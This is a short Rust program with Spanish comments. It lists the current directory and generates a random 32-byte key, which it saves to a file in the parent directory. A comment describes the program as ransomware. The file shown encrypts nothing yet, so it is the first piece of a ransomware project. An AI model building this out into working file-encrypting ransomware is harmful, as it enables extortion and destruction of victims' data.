use rand::{thread_rng, Rng};
use std::fs;
use std::io::{Read, Write};

fn main() {
    let paths = fs::read_dir("./").unwrap();

    for path in paths {
        println!("Name: {}", path.unwrap().path().display())
    }
    genera_clave_cifrado();
}

fn genera_clave_cifrado() {
    let mut clave_file =
        fs::File::create("../clave.key").expect("No se pudo crear el archivo, revise permisos");
    // Creamos un archivo para almacenar la clave de cifrado
    let clave: [u8; 32] = thread_rng().gen();
    println!("{:?}", clave);
    // Generamos un vector de tamaño 32, que contiene 32 campos
    // con un valor u8 cada uno
    clave_file
        .write_all(&clave)
        .expect("No se pudo escribir la clave en el archivo, revise permisos");
    // Almacenamos el archivo con la clave cifrada en el directorio superior
    // del que se ejecuta el ransomware
    let mut archivo = fs::File::open("../clave.key").expect("No se puede leer el archivo");
    let mut contenido: Vec<u8> = Vec::<u8>::new();
    archivo.read_to_end(&mut contenido).unwrap();
    println!("{:?}", contenido);
}
